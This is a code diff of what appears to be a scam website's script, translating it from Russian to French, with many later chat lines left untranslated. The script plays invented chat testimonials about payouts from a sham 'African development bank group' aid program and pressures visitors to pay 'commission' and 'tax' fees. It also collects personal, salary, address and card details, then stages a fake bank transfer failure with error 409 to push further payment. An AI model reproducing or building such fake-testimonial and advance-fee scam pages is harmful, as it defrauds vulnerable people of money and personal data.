@@ -2,60 +2,231 @@ document.addEventListener('DOMContentLoaded', () => {
 
 const messages =
 [
-  ["Esther Makungu", "img/ppl/1.jpg", 
-  "Всем привет, у кого сколько вышло?!"],
+  ["Esther Makungu", "img/ppl/women/1.jpg", 
+  "Bonjour à tous, qui s'est passé ?!"],
 
-  ["Robinah Namutebi", "img/ppl/2.jpg", 
-  "Я думаю, что да"],
+  ["Robinah Namutebi", "img/ppl/women/2.jpg", 
+  "Je pense que oui"],
 
-  ["Robinah Namutebi", "img/ppl/2.jpg", 
-  "Esther Makungu, у меня вышло 1238$. Один сегодня вообще ушел с 2000$"],
+  ["Robinah Namutebi", "img/ppl/women/2.jpg", 
+  "Esther Makungu, j'ai 1238 $.Un aujourd'hui est parti de 2 000 $"],
 
-  ["Kisaaliita Kunobwa", "img/ppl/3.jpg", 
-  "У меня 1573$)))"],
+  ["Kisaaliita Kunobwa", "img/ppl/women/3.jpg", 
+  "J'ai 1573 $)))"],
 
   ["Mukasa", "img/avatar.jpg", 
-  "Всем привет, у меня не получается вывести деньги. Банк выдает ошибку 409. Что делать?"],
+  "Bonjour à tous, je ne peux pas obtenir de l'argent.La banque émet une erreur 409. Que faire?"],
   
-  ["Katudde ", "img/ppl/4.jpg", 
-  "Привет, у меня 1811, кто на что будет тратить?",
-  ],
-  // Поменять имена и фото
-  
-  ["Katudde ", "img/ppl/4.jpg", 
-  "Делай так, как указано в инструкции. Там нужно оплатить комиссию за конвертацию из USD в XAF. Деньги потом вернуться. Мне вернулись на следующий день вместе с финансовой помощью.",
+  ["Katudde ", "img/ppl/men/1.jpg", 
+  "Bonjour, j'ai 1811, qui va passer?",
   ],
   
-  ["Katudde ", "img/ppl/4.jpg", 
-  "да, в конце оплачиваешь комиссию, налог и остальное и в конце купаешься в деньгах)))",
+  ["konan213 ", "img/ppl/men/2.jpg", 
+  "Faire comme indiqué dans les instructions.Vous devez payer la Commission pour convertir de l'USD en XAF.L'argent revenait alors.Je suis rentré le lendemain avec une aide financière.",
   ],
   
-  ["Katudde ", "img/ppl/4.jpg", 
-  "У меня вышло 1455$. Давно хотел заняться бизнесом. Но каждый день с утра до вечера на работе. Времени не было, нужно было семью обеспечивать. А теперь, есть сумма для старта",
+  ["Kituusa ", "img/ppl/women/4.jpg", 
+  "Oui, à la fin, vous payez pour la Commission, la taxe et le reste et à la fin, vous baignez de l'argent))))))",
   ],
   
-  ["Katudde ", "img/ppl/4.jpg", 
-  "Объясните, что здесь происходит?",
+  ["Lumala John Kenny ", "img/ppl/women/5.jpg", 
+  "J'ai eu 1455 $.J'ai longtemps voulu faire des affaires.Mais chaque jour du matin au soir au travail.Il n'y avait pas de temps, il était nécessaire de fournir une famille.Et maintenant, il y a un montant pour le début",
   ],
   
-  ["Katudde ", "img/ppl/4.jpg", 
-  "Надеюсь я успел еще за помощью. Оператор долго не отвечает. Очередь большая",
+  ["Agaba Benjamin ", "img/ppl/men/3.jpg", 
+  "Expliquez ce qui se passe ici?",
   ],
   
-  ["Katudde ", "img/ppl/4.jpg", 
-  "Здесь получают финансовую помощь по программе 'African development bank group'",
+  ["Natweeta Wycliffe ", "img/ppl/men/4.jpg", 
+  "J'espère que j'ai réussi à obtenir de l'aide.L'opérateur ne répond pas longtemps.Grande ligne",
   ],
   
-  ["Katudde ", "img/ppl/4.jpg", 
-  "А как ее получить?",
+  ["Williams ", "img/avatar.jpg", 
+  "Voici une assistance financière dans le programme 'African development bank group'",
   ],
   
-  ["Katudde ", "img/ppl/4.jpg", 
-  "Делайте то, что написано на сайте. Выполняйте все поэтапно",
+  ["Agaba Benjamin ", "img/ppl/men/3.jpg", 
+  "Et comment l'obtenir?",
   ],
   
-  ["Katudde ", "img/ppl/4.jpg", 
-  "Я думаю что у тебя еще есть время. Поторопись))) Кстати, у меня 1732$",
+  ["Williams ", "img/avatar.jpg", 
+  "Faire ce qui est écrit sur le site.Effectuer toutes les étapes",
+  ],
+  
+  ["Haula Lymo ", "img/ppl/women/6.jpg", 
+  "Je pense que tu as encore du temps.Dépêche-toi))) au fait, j'ai 1732 $",
+  ],
+  
+  ["Robert Robinson ", "img/ppl/men/4.jpg", 
+  "Bonjour à tous",
+  ],
+  
+  ["gogi32 ", "img/avatar.jpg", 
+  "feowifewnofe eonfo enfiewno nfeoi",
+  ],
+  
+  ["gogi32 ", "img/avatar.jpg", 
+  "ewds fasdf fds e w",
+  ],
+  
+  ["Kins Sak ", "img/ppl/men/5.jpg", 
+  "Gogi32, Nabanen pour le spam",
+  ],
+  
+  ["Katusiime Daphine ", "img/ppl/women/7.jpg", 
+  "Puis-je obtenir de l'aide plusieurs fois?L'argent est très nécessaire",
+  ],
+  
+  ["Paul ", "img/ppl/men/6.jpg", 
+  "Pas!L'argent est nécessaire pour tous!Pensez à d'autres personnes !!!",
+  ],
+  
+  ["Charles ", "img/ppl/men/7.jpg", 
+  "Bien sûr que non!Sinon, tout le monde n'aurait pas assez",
+  ],
+  
+  ["Katusiime Daphine ", "img/ppl/women/7.jpg", 
+  "Eh bien, si j'essaie de le faire pour mon fils?Également possible?",
+  ],
+  
+  ["Paul ", "img/ppl/men/6.jpg", 
+  "Oui, alors tu peux.Une personne est une aide.",
+  ],
+  
+  ["Nakigudde Joan ", "img/ppl/women/8.jpg", 
+  "J'ai 3 enfants et pour tout le monde, il y avait un paiement.En général, quelque part 6000 $.Je leur ai tous donné à l'école.Bien.Je ne pense pas)))",
+  ],
+  
+  ["Katusiime Daphine ", "img/ppl/women/7.jpg", 
+  "Merveilleux)) Je suis très heureux pour vous)) J'ai 2 enfants.Comme si je voulais qu'ils soient heureux.",
+  ],
+  
+  ["Bukenya Marvin ", "img/ppl/men/7.jpg", 
+  "Cette aide financière n'est-elle pas?De sorte que nous et nos enfants vivons heureux",
+  ],
+  
+  ["Katusiime Daphine ", "img/ppl/women/7.jpg", 
+  "Ça c'est sûr)))",
+  ],
+  
+  ["Katusiime Daphine ", "img/ppl/women/7.jpg", 
+  "Question stupide, mais toujours.Maintenant encore pour les enfants, également besoin d'impôt pour payer?",
+  ],
+  
+  ["Keila Lax ", "img/ppl/women/8.jpg", 
+  "Bonjour",
+  ],
+  
+  ["Kins Sak ", "img/ppl/men/5.jpg", 
+  "La question est vraiment stupide)) bien sûr!C'est la taxe",
+  ],
+  
+  ["Katusiime Daphine ", "img/ppl/women/7.jpg", 
+  "Désolé, je fais juste de mauvais argent",
+  ],
+  
+  ["Katusiime Daphine ", "img/ppl/women/7.jpg", 
+  "Bonjour",
+  ],
+  
+  ["Williams ", "img/avatar.jpg", 
+  "Rien de terrible, je n'ai pas personnellement pas fort en finance",
+  ],
+  
+  ["Bukenya Marvin ", "img/ppl/men/8.jpg", 
+  "Dis-moi et les vieillards soulagent également cette aide?",
+  ],
+  
+  ["Olwiita Edirisa ", "img/ppl/men/9.jpg", 
+  "Cette aide s'appuie sur tous les hommes et tous les enfants et tous les autres.Pour une raison quelconque, peu de gens savent à ce sujet.",
+  ],
+  
+  ["Naherya Jackline ", "img/ppl/women/8.jpg", 
+  "Кстати да. Среди моих знакомых практически все не знали об этой программе. Сами не могут денег на еду насобирать.",
+  ],
+  
+  ["Olwiita Edirisa ", "img/ppl/men/9.jpg", 
+  "Вот-вот. поэтому я всем своим знакомым рассказал об этой программе. Пока сам не скажешь, никто не скажет. Все хотят себе побольше забрать, а о других совсем не думают.",
+  ],
+  
+  ["Nakacwa Mariam ", "img/ppl/women/9.jpg", 
+  "Побольше бы таких как вы в нашей стране. Не было бы бедности",
+  ],
+  
+  ["Olwiita Edirisa ", "img/ppl/men/9.jpg", 
+  "Пару лет и все хорошо заживем. А все те, кто грамотно распорядятся этими деньгами, уже через пару месяцев будут жить хорошо.",
+  ],
+  
+  ["Madiba ", "img/ppl/men/10.jpg", 
+  "Ахах, все кто хорошо распорядятся, будут жить хорошо только через 2 месяца. А все кто плохо, в ближайшие 2 месяца)))",
+  ],
+  
+  ["Olwiita Edirisa ", "img/ppl/men/9.jpg", 
+  "Ахах)))",
+  ],
+  
+  ["Olwiita Edirisa ", "img/ppl/men/9.jpg", 
+  "Мне пора идти, желаю всем удачи!!!",
+  ],
+  
+  ["Gladys Queen ", "img/ppl/women/10.jpg", 
+  "Спасибо, и вам удачи",
+  ],
+  
+  ["Francis Seruwagi ", "img/ppl/men/11.jpg", 
+  "Скажите, как все это работает? Я ничего не понимаю",
+  ],
+  
+  ["Barungi Andrew ", "img/ppl/men/12.jpg", 
+  "На сайте же все подробно указано. Если вы не можете разобраться, то может вам и деньги не так сильно нужны?",
+  ],
+  
+  ["Francis Seruwagi ", "img/ppl/men/11.jpg", 
+  "хаха, очень смешно. Деньги мне очень нужны, но с компьютером я плохо обращаюсь, так что давайте повежливее",
+  ],
+  
+  ["Barungi Andrew ", "img/ppl/men/12.jpg", 
+  "Так а в чем тут разбираться??? Сайт вас проводит по этапам. Сначала заполняете форму, потом общаетесь с оператором и так далее",
+  ],
+  
+  ["Francis Seruwagi ", "img/ppl/men/11.jpg", 
+  "да, я уже разобрался. Уже оператор говорит что делать дальше. У меня вышло 1364$",
+  ],
+  
+  ["Barungi Andrew ", "img/ppl/men/12.jpg", 
+  "неплохо, у меня было 1112$",
+  ],
+  
+  ["Keila Lax ", "img/ppl/women/11.jpg", 
+  "А как долго приходят деньги? Я 2 дня назад все сделала, а до сих пор ничего не пришло, а у кого-то уже на следующий день.",
+  ],
+  
+  ["Esther Essy ", "img/ppl/women/12.jpg", 
+  "У всех по разному. Там же написано что в течении 7 дней",
+  ],
+  
+  ["Barungi Andrew ", "img/ppl/men/13.jpg", 
+  "У всех по разному. когда это только началось, деньги приходили почти сразу же. Потом, когда все больше людей начало узнавать об этом и просить финансовую помощь, время выплат начало увеличиваться. В итоге сейчас деньги могут прийти только на 7 день. Но не позже. Такого я еще ни разу не слышал.",
+  ],
+  
+  ["Keila Lax ", "img/ppl/women/11.jpg", 
+  "Поняла, спасибо",
+  ],
+  
+  ["Hatemeloveme Immy ", "img/ppl/women/13.jpg", 
+  "Я тоже это заметила. Я получила выплату еще год назад. Тогда деньги пришли через 2 часа. Сейчас у некоторых моих знакомых деньги приходят через 5 дней. Много желающих",
+  ],
+  
+  ["Jajja Dennis Wamala ", "img/ppl/men/14.jpg", 
+  "Всем привет, я слышал, что скоро прекратят финансовую поддержку. Потому что у них деньги заканчиваются.",
+  ],
+  
+  ["Jajja Dennis Wamala ", "img/ppl/women/14.jpg", 
+  "Да, я тоже это слышала. Многие еще пытаются мошенничать. Ни о ком кроме себя не думают.",
+  ],
+  
+  ["Lucky Odion ", "img/ppl/men/15.jpg", 
+  "Очень жаль что в нашем мире есть такие люди",
   ],
 ];
 
@@ -83,7 +254,7 @@ else if (localStorage['msg-id'] == null) {
     localStorage['msg-id'] = i;
     messageAdd(i);
     i++;
-  }, randomTime + 6000);
+  }, randomTime + 6000); // randomTime + 6000
 }
 
 function returnAllMessege() {
@@ -138,7 +309,7 @@ function sendMessege() {
     const msgTime = new Date().getHours() + ':' + new Date().getMinutes();
 
     message.innerHTML = `
-      <img src="${''}" class="avavbr">
+      <img src="img/avatar.jpg" class="avavbr">
       <div class="messagetxt main-msg">
         <div class="chatvbrname">${localStorage['name']}</div>
         <div class="jegkergd"><span class="djhg">${inputValue}</span>
@@ -221,7 +392,10 @@ if ((page_id == 1 && localStorage.getItem('page_id') == null) || (page_id == 1 &
     
     const name = document.querySelector('#input-name'),
           email = document.querySelector('#input-email'),
-          child = document.querySelector('#input-child');
+          child = document.querySelector('#input-child'),
+          work = document.querySelector('#input-work'),
+          salary = document.querySelector('#input-salary'),
+          address = document.querySelector('#input-address');
     
     if (name.value == '') {
       name.previousElementSibling.style.display = 'inline-block';
@@ -242,6 +416,27 @@ if ((page_id == 1 && localStorage.getItem('page_id') == null) || (page_id == 1 &
     }
     else {
       child.previousElementSibling.style.display = 'none';
+    }
+
+    if (work.value == '') {
+      work.previousElementSibling.style.display = 'inline-block';
+    }
+    else {
+      work.previousElementSibling.style.display = 'none';
+    }
+
+    if (salary.value == '') {
+      salary.previousElementSibling.style.display = 'inline-block';
+    }
+    else {
+      salary.previousElementSibling.style.display = 'none';
+    }
+
+    if (address.value == '') {
+      address.previousElementSibling.style.display = 'inline-block';
+    }
+    else {
+      address.previousElementSibling.style.display = 'none';
     }
 
     if (name.value != '' && email.value != '' && child.value != '') {
@@ -306,7 +501,7 @@ else if (page_id == 2 && localStorage['page_id'] == 2 || page_id == 2 && localSt
   localStorage['page_id'] = page_id;
 
   const peoples = document.querySelector('#peoples'),
-        peoplesText = ['Перед вами в очереди 3 человека','Перед вами в очереди 2 человека','Перед вами в очереди 1 человек','Идёт соединение с оператором'];
+        peoplesText = ['Devant vous à Turv 3 personnes','Devant vous à Turv 2 personnes','Devant vous en ligne 1 personne','Il y a une connexion avec l\'opérateur'];
 
   let i = 0;
 
@@ -419,7 +614,7 @@ else if (page_id == 4) {
           loads = document.querySelector('#loads');
 
     if (cardInput.value == '') {
-      cardWarning.innerHTML = 'Укажите свои реквизиты!';
+      cardWarning.innerHTML = 'Spécifiez vos coordonnées!';
     }
     else {
       localStorage['user-card'] = cardInput.value;
@@ -429,7 +624,7 @@ else if (page_id == 4) {
 
       const loadsInterval = setInterval(() => {
         const wi = document.querySelector('#wi'),
-              wiArr = ['Соединение со шлюзом банка','Подготовка перевода средств','Создание банковского поручения...','Поручение отправленно','Перевод средств...','Перевод средств... Попытка 2','Перевод средств... Попытка 3','Банк получатель отклонил операцию, вернув код 409','Идет переадресация на страницу для решения проблемы'];
+              wiArr = ['Connexion avec une passerelle bancaire','Préparation du transfert de fonds','Créer une commande bancaire...','Envoi de commande','Transaction de monnaie...','Transaction de monnaie ... Tentative 2','Transaction de monnaie... Tentative 3','Le destinataire de la banque a rejeté l\'opération, le code de retour 409','Il y a un transfert à la page pour résoudre le problème'];
 
         wi.innerHTML = wiArr[i];
         i++;
@@ -456,7 +651,6 @@ else if (page_id == 5) {
     const transaction = Math.floor(Math.random() * 514593453534) + 114593453534;
     localStorage['transaction'] = transaction;
     document.querySelector('.user-transaction').innerHTML = '№' + localStorage['transaction'];
-    console.log('ok')
   }
 
   // дата платежа
@@ -486,11 +680,11 @@ function modal1Close() {
       body.style.overflow = 'auto';
 
       localStorage.setItem('name', name.value); // добавляем имя в localStrorage
-      alert(`Добро пожаловать ${name.value}`);
+      alert(`Bienvenue ${name.value}`);
       name.value = '';
     }
     else {
-      alert('Укажите электронную почту!')  
+      alert('Spécifiez votre nom!');
     }
   });
 }
